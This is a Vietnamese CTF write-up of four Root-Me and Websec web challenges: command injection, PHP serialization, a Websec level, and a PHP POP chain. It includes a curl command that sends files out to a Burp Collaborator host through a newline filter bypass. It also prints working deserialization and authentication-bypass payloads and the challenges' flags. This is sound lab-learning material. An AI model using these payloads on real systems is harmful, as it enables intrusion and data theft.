# rootme & websec writeups

## Index
- [Command injection - Filter bypass](#command-injection---filter-bypass)
- [PHP - Serialization](#php---serialization)
- [Websec level 20](#websec-level-20)
- [PHP - Unserialize Pop Chain](#php---unserialize-pop-chain)


## Command injection - Filter bypass

![image](https://user-images.githubusercontent.com/80137840/225479689-20d917b9-1e02-4f4a-8ee3-66e3255828e2.png)

Trang web trong bài lab

![image](https://user-images.githubusercontent.com/80137840/225481879-5a14fbbf-d997-41b8-86ba-c319615754e4.png)

Nhập đúng IP và ping thành công thì thông báo `Ping OK`. Thử nhập IP 127.0.0.1 và sau đó là các ký tự như '|', '&', '&&', '||', ';' để thực thi tiếp command mới thì response trả về đều là `Syntax Error`. Đây là dạng blind CMDi

![image](https://user-images.githubusercontent.com/80137840/225482493-ef96913e-1370-4197-9a63-f249fac9f136.png)

Tuy nhiên khi sử dụng %0a thì trả về Ping OK. Đề bài cho flag nằm ở file index.php nên ta sẽ send POST request cùng nội dung file index.php làm data trong body request tới Burp Collaborator với syntax như sau: `curl -X POST -d @index.php https://6biwcpqu3yrtyspjnfgp757fj6pxdn1c.oastify.com/`

![image](https://user-images.githubusercontent.com/80137840/225484604-ce22f4c2-c3c0-468a-b905-aec7d10ed6c5.png)

Kiểm tra request nhận được

![image](https://user-images.githubusercontent.com/80137840/225484790-b93eab5d-fff0-48eb-9126-ae7ff5ff6c20.png)

Ta thấy flag có get contents từ file `.passwd`. Send lại POST request với nội dung file .passwd để read flag

![image](https://user-images.githubusercontent.com/80137840/225485037-bba8bfc5-7013-420c-bedc-a85367b3659d.png)

Flag: `Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!`


## PHP - Serialization

![image](https://user-images.githubusercontent.com/80137840/225498212-6c7b4f7c-0b8f-4f27-aceb-18bf5712c88f.png)

Trang web bài lab và source code

![image](https://user-images.githubusercontent.com/80137840/225498347-34f0678e-f249-4868-bc6d-c351dbf6dfb3.png)

```php
<?php
define('INCLUDEOK', true);
session_start();

if(isset($_GET['showsource'])){
    show_source(__FILE__);
    die;
}

/******** AUTHENTICATION *******/
// login / passwords in a PHP array (sha256 for passwords) !
require_once('./passwd.inc.php');


if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = "";
    // form posted ?
    if($_POST['login'] && $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = "autologin";
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = "Error : $autologin authentication failed !";
    }
}
/*********************************/
?>


<html>
<head>
<style>
label {
    display: inline-block;
    width:150px;
    text-align:right;
}
input[type='password'], input[type='text'] {
    width: 120px;
}
</style>
</head>
<body>
<h1>Restricted Access</h1>

<?php

// message ?
if(!empty($message))
    echo "<p><em>$message</em></p>";

// admin ?
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
// user ?
elseif (isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    require_once('user.inc.php');
}
// not authenticated ? 
else {
?>
<p>Demo mode with guest / guest !</p>

<p><strong>superadmin says :</strong> New authentication mechanism without any database. <a href="index.php?showsource">Our source code is available here.</a></p>

<form name="authentification" action="index.php" method="post">
<fieldset style="width:400px;">
<p>
    <label>Login :</label>
    <input type="text" name="login" value="" />
</p>
<p>
    <label>Password :</label>
    <input type="password" name="password" value="" />
</p>
<p>
    <label>Autologin next time :</label>
    <input type="checkbox" name="autologin" value="1" />
</p>
<p style="text-align:center;">
    <input type="submit" value="Authenticate" />
</p>
</fieldset>
</form>
<?php
}

if(isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    echo "<p><a href='disconnect.php'>Disconnect</a></p>";
}
?>
</body>
</html>
```

Thử login vào account `guest:guest` và tick Autologin next time và kiểm tra request

![image](https://user-images.githubusercontent.com/80137840/225506928-429efb71-c0e8-4611-ad08-1161c9715455.png)

Server trả về 1 cookie autologin được serialized có dạng:

`a:2:{s:5:"login";s:5:"guest";s:8:"password";s:64:"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec";}`

Kiểm tra source code ta thấy để login với tài khoản administrator ta cần thay `guest` thành `superadmin`

![image](https://user-images.githubusercontent.com/80137840/225508037-a40ec3ac-f2b7-4321-8440-b6f99e111962.png)

Tại vị trí check password, trang web chỉ thực hiện so sánh loose với `$auth[ $data['login'] ]`

![image](https://user-images.githubusercontent.com/80137840/225508503-d195387b-8111-44d8-85b2-956e82aa9235.png)

nên ta có thể thay `password` bằng True sẽ bypass được phép kiểm tra này (do boolean True == String khác rỗng)

Như vậy cookie autologin serialized để login as administrator sẽ có dạng:

`a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}`

Apply changes và send request

![image](https://user-images.githubusercontent.com/80137840/225509490-c7fd4267-de26-4fe8-8c38-16e498bb6dae.png)

Flag: `NoUserInputInPHPSerialization!`


## Websec level 20

Trang web bài lab và source code

![image](https://user-images.githubusercontent.com/80137840/225511093-016c335d-fee1-4b3d-97bc-238a64a25ccf.png)

```php
<?php

include "flag.php";

class Flag {
    public function __destruct() {
       global $flag;
       echo $flag; 
    }
}

function sanitize($data) {
    /* i0n1c's bypass won't save you this time! (https://www.exploit-db.com/exploits/22547/) */
    if ( ! preg_match ('/[A-Z]:/', $data)) {
        return unserialize ($data);
    }

    if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:"/', $data )) {
        return unserialize ($data);
    }

    return false;
}

$data = Array();
if (isset ($_COOKIE['data'])) {
    $data = sanitize (base64_decode ($_COOKIE['data']));
}

if (isset ($_POST['value']) and ! empty ($_POST['value'])) {
    /* Add a value twice to remove it from the list. */
    if (($key = array_search ($_POST['value'], $data)) !== false) {
        unset ($data[$key]);
    } else { /* Else, simply add it. */
        array_push ($data, $_POST['value']);
    }
    setcookie ('data', base64_encode (serialize ($data)));
}

?>
```

Ta cần phải tạo chuỗi serialized object cho đối tượng của class Flag. Class này có 1 magic method `__destruct()` để in ra flag. Chuỗi serialized object được truyền vào thông qua cookie `data` được base64 sau đó truyền vào hàm sanitize(). Nhưng hàm này không serialize chuỗi bắt đầu với `O:[0-9+]+:"` cho nên ta cần phải tìm cách serialize khác để thay thế. Theo PHP documentation, ta có thể sử dụng C thay O trong chuỗi serialized object, đây được gọi là dạng customized serializing. Khi đó chuỗi serialized object được tạo sẽ có dạng: `C:4:"Flag":0:{}`

Apply changes cho cookie `data`

![image](https://user-images.githubusercontent.com/80137840/225514783-fb9f4062-6c3e-4721-8faf-ade2c0b49568.png)

Flag: `WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}`


## PHP - Unserialize Pop Chain

![image](https://user-images.githubusercontent.com/80137840/225515283-cd2b78d1-00fc-474c-844f-716d5b120b05.png)

Source code:

```php
<?php
 
$getflag = false;
 
class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }
 
    function __toString() {
        return $this->receive;
    }
 
    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
            }
        }
    }
}
 
class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }
 
    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}
 
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}
 
if (isset($_POST["data"]) && !empty($_POST["data"])) {
    unserialize($_POST["data"]);
}
 
?>
 
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="UTF-8">
    <title>PHP - Unserialize Pop Chain</title>
  </head>
  <body>
    <h1>PHP - Unserialize Pop Chain</h1>
    <hr>
    <br>
    <p>
      Can you bypass the security your friend put in place to access the flag?
    </p>
    <br>
    <form class="" action="index.php" method="post">
      <textarea name="data" rows="5" cols="33" style="width:35%"></textarea>
      <br>
      <br>
      <button type="submit" name="button" style="width:35%">Submit</button>
    </form>
    <br>
    <p>
      You can also <a href="?source">View the source</a>
    </p>
  </body>
</html>
```

Để in flag bài này ta cần khiến cho `$receive === "HelloBooooooy"` và `$getflag = True`. Tuy nhiên nếu khởi tạo đối tượng class GetMessage với `$receive` bằng "HelloBooooooy" thì chương trình sẽ chạy vào lệnh `die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");` và kết thúc. Để bypass điều này, ta sẽ khởi tạo đối tượng class GetMessage với `$receive = abcxyz` rồi sau đó mới gán giá trị cho thuộc tính `receive = "HelloBooooooy"` như sau:

```
$obj1 = new GetMessage('abcxyz');
$obj1->receive = "HelloBooooooy";
```

Tiếp theo để `$getflag = True` ta cần phải gọi đến magic method `__toString()` của class WakyWaky, mà để có thể gọi đến `__toString()` của WakyWaky ta cần gọi method `__wakeup()` do trong xử lý của magic method này có phép nối chuỗi với thuộc tính `msg`. Và method `__wakeup()` của WakyWaky chỉ được gọi khi ta unserialize 1 đối tượng của class này. Như vậy ta sẽ phải tạo ra 2 đối tượng class WakyWaky và gán 1 đối tượng cho thuộc tính `msg` của đối tượng kia như sau:

```
$obj2 = new WakyWaky();
$obj3 = new WakyWaky(); 
$obj3->msg = $obj2;
```

Xâu chuỗi lại các gadget chains, ta sẽ gán đối tượng obj1 cho thuộc tính `msg` của đối tượng obj2, khi unserialize sẽ gọi đến `__toString()` của class GetMessage và return giá trị `$obj1->receive = "HelloBooooooy"` cho `"[YOU]: ".$this->msg."<br>"`

Cuối cùng, chuỗi serialized object sẽ được tạo như sau:

```php
<?php
 
$getflag = false;
 
class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }
 
    function __toString() {
        return $this->receive;
    }
 
    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
            }
        }
    }
}
 
class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }
 
    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}
 
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}
 
if (isset($_POST["data"]) && !empty($_POST["data"])) {
    unserialize($_POST["data"]);
}
 

$obj1 = new GetMessage('abcxyz');
$obj1->receive = "HelloBooooooy";

$obj2 = new WakyWaky();
$obj2->msg = $obj1;

$obj3 = new WakyWaky(); 
$obj3->msg = $obj2;

echo serialize($obj3);
//O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}

?>
```

Submit chuỗi serialize này và nhận được flag

![image](https://user-images.githubusercontent.com/80137840/225534354-a372a11f-98c0-4e33-89a2-43e94e2a988f.png)

Flag: `uns3r14liz3_p0p_ch41n_r0cks`

